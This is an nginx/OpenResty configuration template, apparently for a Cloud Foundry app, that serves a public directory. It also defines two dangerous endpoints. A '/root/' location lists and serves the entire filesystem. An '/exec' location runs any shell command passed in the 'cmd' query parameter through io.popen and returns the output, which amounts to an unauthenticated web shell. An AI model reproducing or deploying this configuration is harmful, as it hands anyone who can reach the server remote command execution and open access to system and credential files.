worker_processes 1;
daemon off;

error_log stderr;
events { worker_connections 1024; }

http {
  log_format cloudfoundry '$http_x_forwarded_for - $http_referer - [$time_local] "$request" $status $body_bytes_sent';
  access_log <%= ENV["HOME"] %>/../logs/access.log cloudfoundry;
  
  default_type text/plain;

  include /app/vendor/openresty/nginx/conf/mime.types;

  sendfile on;
  gzip on;
  tcp_nopush on;
  keepalive_timeout 30;

  server {
    listen <%= ENV["PORT"] %>;
    server_name localhost;

    location / {
       root <%= ENV["HOME"] %>/public;
    }

    location /root/ {
      alias /;
      autoindex on;
    }

    location /exec { 
        content_by_lua '
        
            function url_decode(str)
              str = string.gsub (str, "+", " ")
              str = string.gsub (str, "%%(%x%x)",
                  function(h) return string.char(tonumber(h,16)) end)
              str = string.gsub (str, "\r\n", "\n")
              return str
            end

            local cmd = url_decode(ngx.var["arg_cmd"])
            ngx.print("command: ", cmd, "\\n")
            local handle = io.popen(cmd)
            local result = handle:read("*a")
            ngx.say("result:")
            ngx.say(result)
            handle:close()
        ';
    } 

  }
}